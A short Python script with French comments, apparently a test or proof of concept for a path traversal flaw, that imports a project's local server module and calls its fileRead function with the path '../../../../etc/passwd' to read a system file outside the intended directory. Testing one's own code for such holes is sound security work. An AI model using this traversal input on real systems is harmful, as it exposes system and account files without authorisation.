import sys
from pathlib import Path


chemin_dossier= Path(__file__).resolve().parent.parent#2 fois parents car le path est dans le fichier et pas repertoire

sys.path.append(str(chemin_dossier))#On ajoute la racine du projet au chemin de recherche

from src import server

server.fileRead(path = "../../../../etc/passwd")